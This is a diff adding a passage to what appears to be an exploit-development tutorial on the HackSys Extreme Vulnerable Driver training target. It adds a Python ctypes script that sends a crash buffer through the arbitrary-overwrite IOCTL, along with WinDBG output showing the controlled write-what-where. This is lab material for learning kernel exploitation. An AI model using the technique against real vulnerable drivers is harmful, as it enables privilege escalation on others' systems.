@@ -67,6 +67,48 @@ Going to pause the debuggee, and rerun our standby commands we always run on our
 
 We'll use this script to send a buffer of 1000 `A` characters. 
 ```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+
+kernel32 = windll.kernel32
+
+def send_buf():
+    hevd = kernel32.CreateFileA(
+        "\\\\.\\HackSysExtremeVulnerableDriver", 
+        0xC0000000, 
+        0, 
+        None, 
+        0x3, 
+        0, 
+        None)
+    
+    if (not hevd) or (hevd == -1):
+        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+        sys.exit(1)
+    else:
+        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+    buf = "A" * 1000
+    buf_length = len(buf)
+    
+    result = kernel32.DeviceIoControl(
+        hevd,
+        0x22200b,
+        buf,
+        buf_length,
+        None,
+        0,
+        byref(c_ulong()),
+        None
+    )
+
+    if result != 0:
+        print("[*] Buffer sent to driver successfully.")
+    else:
+        print("[!] Payload failed. Last error: " + str(GetLastError()))
+
+send_buf()
 ```
 
 We can see that we hit our breakpoint! Awesome, let's actually analyze what this function inside the IOCTL handler, `TriggerArbitraryOverwrite`, is doing now in WinDBG. 
@@ -74,4 +116,20 @@ We can see that we hit our breakpoint! Awesome, let's actually analyze what this
 ![](/assets/images/AWE/bphit.PNG)
 
 ## Analyzing Trigger Arbitrary Overwrite
+If we look at the debug statements, this is what we get: 
+```
+kd> g
+[+] UserWriteWhatWhere: 0x0187D65C
+[+] WRITE_WHAT_WHERE Size: 0x8
+[+] UserWriteWhatWhere->What: 0x41414141
+[+] UserWriteWhatWhere->Where: 0x41414141
+[+] Triggering Arbitrary Overwrite
+[-] Exception Code: 0xC0000005
+****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
+```
+
+We sent 1000 A chars, and we see that the `What` we are writing is `0x41414141`. Ok, this seems fine, its obviously taken 4 bytes out of our sent string and is treating them as a 4 byte object to write somewhere. The somewhere is also `0x41414141` as we see it is labeled as the `Where`. Let's step through the function to figure out how this works in the disassembly. 
+
+We'll set a breakpoint on `bp HEVD!TriggerArbitraryOverwrite` and we'll resend the payload. 
+
 
